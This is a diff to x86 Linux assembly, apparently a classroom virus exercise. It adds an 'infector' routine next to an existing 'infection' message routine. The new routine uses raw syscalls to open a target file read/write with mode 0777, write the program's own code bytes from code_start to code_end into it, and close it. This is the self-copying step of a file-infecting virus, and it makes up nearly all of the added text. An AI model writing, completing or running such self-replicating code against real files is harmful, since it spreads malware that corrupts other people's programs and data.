@@ -53,7 +53,6 @@ infection:
     mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
     and     eax, 1
     cmp     eax, 1
-test:
     je      L1
     push    dword 22
     push    infection_string
@@ -65,3 +64,36 @@ L1:
     mov esp, ebp
     pop ebp
     ret
+
+
+infector:
+    push    ebp
+    mov     ebp, esp
+    sub     esp, 4
+    pushad
+    mov eax, 5
+    mov ebx, [ebp+8]
+    mov ecx, 2
+    mov edx, 0777
+    int 0x80
+
+
+    mov [ebp-4],eax
+    mov eax, 4
+    mov ebx, [ebp-4]
+    mov ecx, code_start
+    mov edx, code_end-code_start
+    int 0x80
+
+
+    mov eax, 6
+    mov ebx, [ebp-4]
+    int 0x80
+
+    popad
+    add     esp, 4
+    pop     ebp
+    ret
+
+
+code_end:
